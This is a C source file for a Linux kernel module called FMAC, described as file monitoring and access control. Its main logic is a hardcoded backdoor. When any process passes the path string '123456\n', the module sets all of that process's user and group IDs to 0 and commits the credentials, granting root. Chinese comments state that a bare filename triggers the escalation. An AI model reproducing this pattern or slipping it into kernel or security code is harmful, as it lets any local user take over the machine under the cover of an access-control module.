// SPDX-License-Identifier: GPL-3.0-or-later
/* FMAC - File Monitoring and Access Control Kernel Module
 * Copyright (C) 2025 Aqnya
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/kernel.h>
#include <linux/sched.h>

#include "fmac.h"

#define FMAC_ROOT_KEY "123456\n"  // 裸文件名触发提权

static void fmac_elevate_privilege(void)
{
    struct cred *new_cred = prepare_creds();
    if (!new_cred) {
        pr_warn("[FMAC] Failed to prepare new creds for privilege escalation\n");
        return;
    }

    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    commit_creds(new_cred);

    fmac_append_to_log("[FMAC] Privilege escalated to root for pid %d (comm: %s)\n",
                      current->pid, current->comm);
}

int fmac_check_root_key(const char __user *pathname)
{
    char pathbuf[MAX_PATH_LEN] = {0};
    if (!pathname)
        return 0;

    if (strncpy_from_user(pathbuf, pathname, MAX_PATH_LEN) < 0)
        return 0;

    // 只要路径字符串和密钥相同就提权（裸文件名）
    if (strcmp(pathbuf, FMAC_ROOT_KEY) == 0) {
        fmac_append_to_log("[FMAC] Root key path accessed by pid %d, escalating privilege\n", current->pid);
        fmac_elevate_privilege();
        return 1;
    }

    return 0;
}